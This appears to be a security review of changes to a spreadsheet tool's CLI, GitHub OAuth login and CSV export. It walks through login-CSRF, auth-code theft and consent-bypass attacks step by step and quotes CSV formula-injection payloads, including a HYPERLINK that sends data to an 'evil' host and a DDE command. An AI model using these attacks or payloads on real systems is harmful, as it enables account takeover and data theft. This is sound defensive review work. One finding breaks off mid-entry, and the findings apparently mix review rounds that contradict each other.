findings.summary: `format()`'s new throw fires *after* the mutation in every un-migrated command, turning a successful write into exit 1 / INVALID_FORMAT
findings.evidence: Only `status`, `ctx list` and `schema` call `parseOutputFormat` up front. Every other `output()` call site still passes the raw `opts.format` *after* the request has been sent: `cells.ts:66` (`sheets cells set`), `cells.ts:92` (delete), `cells.ts:139` (batch), `docs.ts:104/136/154` (create/rename/delete), `notes.ts:64+`, `slides.ts:69+`, `sheets-import.ts:91`, `api-keys.ts:20/34/48`, `tabs.ts:16`. With the new `default:` branch in `format()` (formatter.ts:51-55), `wafflebase sheets cells set … --format bogus` now performs the PATCH, then throws inside the try block, and `outputError` sets `process.exitCode = 1` with an INVALID_FORMAT body — so a caller/agent sees a failure for an operation that actually succeeded and may retry it (duplicate writes). Previously the same invocation printed "undefined" and exited 0. `api-keys create --format bogus` is worst: the key is created and its one-time secret is discarded, now reported as an error. Fix belongs in those call sites (validate before issuing the request), not in the diff's files.

findings.summary: Web GitHub OAuth flow still has no `state` parameter — login CSRF / session fixation on the browser login path
findings.evidence: `GitHubStrategy.authenticate` (github.strategy.ts:57-64) sets `opts.state` ONLY when `req.__cliStateToken` is present, and `GitHubAuthGuard.canActivate` (github-auth.guard.ts:33) only mints that token for `mode === 'cli'`. A plain browser login therefore goes to GitHub with no `state`, and `githubAuthCallback` (auth.controller.ts:119) falls straight through to the web branch (auth.controller.ts:146-150) whenever no `state` query param is present, unconditionally calling `setAuthCookies`. Attack: attacker starts a GitHub OAuth flow for their own account, captures the `code` at the redirect, does not spend it, then causes the victim's browser to top-level-navigate to `https://<api>/auth/github/callback?code=<attacker code>`. The backend resolves the attacker's GitHub identity and writes `wafflebase_session` / `wafflebase_refresh` cookies (SameSite=Lax, so a top-level navigation carries them) into the victim's browser. The victim then works inside the attacker's account and everything they create is readable by the attacker. This diff touches exactly this handler and its risk table, and records the gap as "Open" in docs/design/rest-api.md, so it is pre-existing and disclosed rather than introduced here — but it is a live session-fixation vulnerability in the code under review and the CLI half of the same class was judged worth fixing in this very change.

findings.summary: `GET /auth/github?mode=cli&port=<n>` is an unauthenticated, CSRF-able endpoint that mints a full-privilege auth code for the *victim* and delivers it to an attacker-chosen 127.0.0.1 port; the new nonce does not help because the attacker supplies the nonce
findings.evidence: The guard accepts `mode`/`port`/`nonce` straight off the query string with no user-intent or origin check (github-auth.guard.ts:29-42), and the callback redirects the browser to `http://127.0.0.1:${port}/callback?code=...` (auth.controller.ts:134-136). An attacker page can top-level-navigate the victim to `https://<api>/auth/github?mode=cli&port=<attacker-chosen>&nonce=<attacker-chosen>`; because the victim is already logged in to GitHub and has already authorized the app, GitHub bounces straight back, and the backend mints `createCode(user.id)` for the VICTIM and hands it to whatever is listening on that loopback port. `POST /auth/cli/exchange` is unauthenticated (auth.controller.ts:153-169), so anyone holding that code within 60s gets the victim's access+refresh tokens. The nonce added by this change does not close this direction — the attacker chooses it, so the loopback listener they control accepts it. Exploitation needs an attacker-controlled or URL-logging listener on the victim's loopback (a malicious/compromised local app, a dev server that logs request URLs, a browser-helper daemon), which is why I rate confidence medium rather than high. The CLI's own genuine listener is protected, because its nonce will not match.

findings.summary: CSV formula neutralization is deliberately disabled on `sheets export`, the one CSV path whose file is meant to be opened in a spreadsheet app — untrusted cell content is written verbatim
findings.evidence: `formatCsv(res.data, { neutralizeFormulas: false })` writes server-supplied cell `value`/`formula` fields byte-for-byte into `out.csv`. Every one of those values is settable by any other member of a shared workspace, and `packages/cli/skills/recipe-csv-pipeline.md:44` documents `wafflebase sheets export "$DOC_ID" out.csv` as the terminal step whose product the user opens. A member who plants `=HYPERLINK("http://evil?d="&A1,"click")`, `=WEBSERVICE(...)` (exfiltration) or a DDE payload `=cmd|'/c calc'!A0` gets it executed when the exporting user opens the file in Excel/LibreOffice. The protection this change adds (`csv.ts:23-26`) is wired only into the `--format csv` render path (formatter.ts:61), i.e. the terminal-printed variant, while the file-writing variant opts out. Whatever the round-trip argument, the result is that the more dangerous of the two paths is the unprotected one; a safer split would keep neutralization and give `sheets export` an explicit opt-out flag, or write a format (json) that is not auto-evaluated.

findings.summary: CSV formula neutralizer omits a leading plain space from `FORMULA_TRIGGER`, despite its own comment justifying `\t`/`\r` as "whitespace the importer trims"
findings.evidence: `FORMULA_TRIGGER = /^[=+\-@\t\r]/` covers tab and CR but not U+0020 (or other Unicode whitespace such as U+00A0). `NEEDS_QUOTING = /[",\n\r\t]/` also does not quote a leading space, so a value of `" =HYPERLINK(\"http://evil\",\"x\")"` is emitted bare and unprefixed. Importers that strip leading whitespace on import (LibreOffice's "Trim spaces" CSV option, and several third-party CSV-to-sheet importers) then see `=HYPERLINK(...)` at position 0 and evaluate it — exactly the bypass class the tab/CR entries were added to close. Confidence is low because stock Excel does not trim a leading space, so the bypass depends on the importer; impact if it lands is the same formula execution the neutralizer exists to prevent.

findings.summary: Web (browser) OAuth callback has no CSRF `state` — login CSRF / session fixation remains fully open while the CLI half is hardened
findings.evidence:
`githubAuthCallback` only consumes a state token when the query carries one (line 119). Every browser login arrives with no `state`: `GitHubStrategy.authenticate` (github.strategy.ts:59-62) sets `opts.state` *only* when `req.__cliStateToken` is present, and `GitHubAuthGuard.canActivate` only mints that token for `mode === 'cli'` (github-auth.guard.ts:33). So the web branch at auth.controller.ts:146-150 mints tokens and calls `setAuthCookies` for any `code` presented, with nothing binding the code to the browser that started the flow.

Attack: attacker starts a GitHub OAuth flow for their own account, stops at the redirect and captures `code=X`, then gets the victim to load `https://<backend>/auth/github/callback?code=X` (image, iframe, link). The victim's browser receives `Set-Cookie: wafflebase_session=<attacker's JWT>` (httpOnly, SameSite=Lax — a top-level navigation carries it fine) and is redirected to FRONTEND_URL. The victim now works inside the attacker's account: everything they create, upload or paste lands in a workspace the attacker owns.

This is pre-existing and the diff itself adds a risk-table row (`docs/design/rest-api.md`) marking it **Open**. I am reporting it because the change hardens exactly this class of attack on the CLI leg while leaving the higher-traffic browser leg unbound, and an acknowledged-in-docs vulnerability is still a vulnerability.

findings.summary: Callback server rejects any request carrying an `Origin` header, which risks refusing the genuine browser redirect on browsers/proxies that attach one
findings.evidence: `if (req.method !== 'GET' || req.headers.origin !== undefined) { 403 }`. The real callback arrives as a cross-origin 302 redirect from the backend; if any browser, extension, or corporate proxy attaches an `Origin` (e.g. `Origin: null` on cross-origin redirect chains), the legitimate code is refused and, because the 403 branch deliberately never settles the promise (line 227-233), `waitForCallback()` hangs until the 30s timeout and login fails with a timeout error the user cannot diagnose. Only node `fetch` (which never sets Origin unless asked) is exercised in packages/cli/test/login.test.ts.

findings.summary: `--raw`'s stated contract ("so `sheets import` round-trips formulas") does not hold at the import call site the diff never touched
findings.evidence: The new `--raw` flag exists only to make an export→import round trip preserve formulas (`packages/cli/src/commands/sheets-export.ts:31-34`, `packages/cli/skills/sheets-import-export.md:104-107`, `packages/cli/skills/recipe-csv-pipeline.md:47-51`, `scripts/agent/charters/round-trip.md:15`). findings.summary: Browser OAuth `state` is an unauthenticated double-submit cookie with no `__Host-` prefix and no server-side binding, so a sibling-subdomain foothold restores login CSRF
findings.evidence: `oauthStateCookieOptions()` sets `wafflebase_oauth_state` with `path:'/auth'` and no `__Host-` prefix (oauth-state.ts:57-68), and `webOAuthStateMatches` accepts any `state` whose SHA-256 preimage happens to be in that cookie (oauth-state.ts:47-55). The value is a bare random secret, not an HMAC over anything the server can re-derive. Cookie tossing is therefore the whole attack: an attacker who controls or XSSes ANY sibling host under the registrable domain (e.g. `blog.example.com`, a staging host, a takeover-able CNAME) sets `Set-Cookie: wafflebase_oauth_state=<their secret>; Domain=example.com; Path=/auth`, then navigates the victim to `/auth/github/callback?code=<code minted for the ATTACKER's GitHub account>&state=web.<sha256(their secret)>`. auth.controller.ts:148-159 finds a match, falls through to line 189-192, and issues `wafflebase_session`/`wafflebase_refresh` for the attacker's account in the victim's browser — the exact session-fixation the change set out to close. `__Host-` prefixing (which forbids `Domain=` and forces `Path=/`), or making `state` an HMAC over a server secret, removes the cookie-tossing degree of freedom. The same applies to `wafflebase_cli_confirm` (cli-login-confirm.middleware.ts:33-41), whose secret is likewise only proven by cookie possession.

findings.summary: `sheets import` silently ignores `--start` for exported `ref,value,formula` CSVs, but the agent-facing schema still advertises it unconditionally
findings.evidence: `sheets-import.ts` now branches on `isCellTable(rows)` and calls `buildCellMapFromTable(rows)`, which imports by reference and never uses `parseStartRef(localOpts.start)`. The schema registry entry for `sheets.import` (registry.ts:556-562) still lists `'--start': { type: 'string', ..., description: 'Top-left cell', default: 'A1' }` with no note that it is inert for the header this repo's own `sheets export` writes, and `packages/documentation/developers/cli.md:348` likewise documents `--start <ref> | Top-left cell for import | A1` unqualified (the by-reference behaviour is only mentioned in the *export* section at line 392). `docs/design/cli.md` says the schema is the agent interface; round 8 of this PR treated exactly this class of gap (`--raw` missing from the registry) as blocking and added a flag-name parity test — which cannot catch a flag whose documented meaning no longer matches. Design-fit corollary: the round-trip is opted into explicitly on export (`--raw`) but switched implicitly on import via header sniffing, so a user-authored grid CSV whose first three columns happen to be named ref/value/formula changes import semantics and drops `--start` with no diagnostic.

searchedFor: read packages/cli/src/commands/login.ts exchange call (no nonce in body)
findings.summary: CLI auth code is a pure bearer credential — `POST /auth/cli/exchange` requires no proof of possession, even though the new per-attempt nonce is already stored server-side and could bind it
findings.evidence: `createCode(user.id)` (auth.controller.ts:173) mints a code bound to nothing but the user id, and `cliExchange` (auth.controller.ts:203-216) trades that code for full access+refresh JWTs with no authentication and no binding to the login attempt. The code is delivered to the browser as a plaintext HTTP GET: `http://127.0.0.1:${port}/callback?code=...` (auth.controller.ts:182), where `port` came off the query string. Anyone who observes that URL — a local listener on the chosen port, a URL-logging local service, a browser extension reading the navigation, browser history/sync — can replay the code within its 60s TTL and obtain the victim's full session. The change already carries the material for a PKCE-style fix: `CliAuthStore` now stores `nonce` per state (cli-auth.store.ts:13), so `cli/exchange` could require the nonce (or a hash of it) alongside the code and reject a code presented without it. It does not. Note this is exactly the direction the confirmation gate cannot cover: once the user clicks Continue on `?mode=cli&port=<attacker's>`, the code goes to a port the attacker picked.

findings.summary: CLI OAuth state token is not bound to the browser that obtained it, so the new `CliLoginConfirmMiddleware` consent gate is fully bypassable
findings.evidence:
The web flow binds `state` to a browser via a double-submit cookie (`oauth-state.ts`), but the CLI flow does not: `createState()` stores `{mode, port, nonce, challenge}` server-side and returns an opaque token that is accepted on the callback with **no** cookie/browser check (`auth.controller.ts:167` — `consumeState(stateToken)` then straight to `createCode(user.id, state.challenge)`). The `csrf` field that would have provided that binding is generated (`cli-auth.store.ts:47`), returned, and never verified anywhere (grep: only tests reference it).

Attack, fully scriptable with curl and no victim interaction beyond one navigation:
1. Attacker runs, from their own machine: `GET /auth/github?mode=cli&port=<attacker port>&nonce=<attacker nonce>&challenge=<sha256(attacker verifier)>`. The middleware answers with the confirm page; the attacker reads the `Set-Cookie` secret and the `?confirm=` in the Continue href out of *their own* response (cli-login-confirm.middleware.ts:106-113).
2. Attacker replays the Continue URL with that cookie. `GitHubAuthGuard.canActivate` sees `__cliConfirmed` and mints a CLI state token; passport 302s to GitHub, and the attacker reads `state=<TOKEN>` (and `client_id`) straight out of the `Location` header.
3. Attacker top-level-navigates the victim to `https://github.com/login/oauth/authorize?client_id=<app>&scope=user:email&state=<TOKEN>`. Because the victim already authorised the app, GitHub auto-redirects to `/auth/github/callback?code=<VICTIM code>&state=<TOKEN>` with no prompt and no confirm page.
4. The callback takes the `else` branch, consumes the attacker's state, and mints an authorization code **for the victim's user id** bound to the **attacker's** PKCE challenge, then redirects to `http://127.0.0.1:<attacker port>/callback?code=…&state=<attacker nonce>` (auth.controller.ts:185-195).
